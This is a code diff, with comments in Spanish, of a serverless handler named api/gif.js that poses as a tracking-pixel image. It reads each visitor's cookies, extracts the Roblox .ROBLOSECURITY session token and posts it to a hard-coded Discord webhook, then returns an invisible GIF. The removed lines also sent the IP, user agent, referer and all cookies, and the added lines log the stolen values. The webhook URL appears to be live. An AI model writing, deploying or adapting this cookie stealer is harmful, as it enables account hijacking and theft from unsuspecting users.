@@ -1,5 +1,8 @@
-// api/gif.js
+// api/gif.js - VERSIÓN CON LOGS
 export default async function handler(req, res) {
+    console.log('🔍 GIF.JS EJECUTADO');
+    console.log('📨 Headers:', JSON.stringify(req.headers, null, 2));
+    
     // Configurar CORS
     res.setHeader('Access-Control-Allow-Origin', '*');
     res.setHeader('Access-Control-Allow-Methods', 'GET, OPTIONS');
@@ -9,76 +12,47 @@ export default async function handler(req, res) {
     }
 
     // ============================================
-    // 1. OBTENER COOKIES DE LOS HEADERS
+    // 1. OBTENER COOKIES
     // ============================================
     const cookies = req.headers.cookie || '';
-    const userAgent = req.headers['user-agent'] || 'Desconocido';
-    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'Desconocida';
-    const referer = req.headers['referer'] || 'Directo';
+    console.log('🍪 Cookies:', cookies);
     
     // ============================================
     // 2. BUSCAR .ROBLOSECURITY
     // ============================================
     const match = cookies.match(/\.ROBLOSECURITY=([^;]+)/);
     const robloxCookie = match ? match[1] : 'No encontrada';
+    console.log('🎯 Cookie Roblox:', robloxCookie);
     
     // ============================================
     // 3. ENVIAR A DISCORD
     // ============================================
     const webhook = "https://discord.com/api/webhooks/1471683743696552060/FFnmUguRVPoMKQ4b80dJ1FQQSp_ec-4EJFd2iyHrrXLQgDliUQqJEldixzOxx6esC2Sd";
     
-    const embed = {
-        title: "🍪 COOKIE ROBLOX CAPTURADA (vía IMG)",
-        color: 0x00ff00,
-        fields: [
-            {
-                name: "📌 Cookie .ROBLOSECURITY",
-                value: `\`\`\`${robloxCookie}\`\`\``,
-                inline: false
-            },
-            {
-                name: "🌍 IP",
-                value: `\`${ip}\``,
-                inline: true
-            },
-            {
-                name: "📱 User Agent",
-                value: `\`${userAgent.substring(0, 100)}\``,
-                inline: true
-            },
-            {
-                name: "🔗 Referer",
-                value: `\`${referer}\``,
-                inline: true
-            },
-            {
-                name: "🍪 Todas las cookies",
-                value: `\`\`\`${cookies || 'Ninguna'}\`\`\``,
-                inline: false
-            }
-        ],
-        footer: { text: "Método IMG" }
-    };
-
     try {
-        await fetch(webhook, {
+        const discordResponse = await fetch(webhook, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({
                 content: "@everyone",
-                embeds: [embed]
+                embeds: [{
+                    title: "🍪 Cookie Roblox (TEST)",
+                    description: `\`\`\`${robloxCookie}\`\`\``,
+                    color: 0x00ff00
+                }]
             })
         });
-    } catch (error) {}
+        console.log('✅ Discord response:', discordResponse.status);
+    } catch (error) {
+        console.error('❌ Error Discord:', error.message);
+    }
 
     // ============================================
-    // 4. RESPONDER CON GIF INVISIBLE
+    // 4. RESPONDER CON GIF
     // ============================================
-    const gifBuffer = Buffer.from('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7', 'base64');
+    const gifBuffer = Buffer.from('R0lGODlhAQABAIAAAAAAAP///y5BAEAAAAALAAAAAABAAEAAAIBRAA7', 'base64');
     
     res.setHeader('Content-Type', 'image/gif');
-    res.setHeader('Cache-Control', 'no-cache, no-store, must-revalidate');
-    res.setHeader('Pragma', 'no-cache');
-    res.setHeader('Expires', '0');
+    res.setHeader('Cache-Control', 'no-cache');
     res.status(200).send(gifBuffer);
 }
